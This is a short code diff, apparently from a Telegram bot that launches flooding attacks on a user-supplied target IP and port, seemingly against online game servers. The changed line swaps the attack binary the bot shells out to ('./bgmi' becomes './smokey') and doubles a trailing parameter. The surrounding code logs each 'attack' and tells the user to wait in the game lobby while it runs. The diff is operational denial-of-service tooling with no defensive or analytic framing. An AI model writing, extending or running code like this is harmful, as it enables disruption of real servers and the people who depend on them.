@@ -385,7 +385,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 900"
+                full_command = f"./smokey {target} {port} {time} 1800"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n‼️ 𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼"
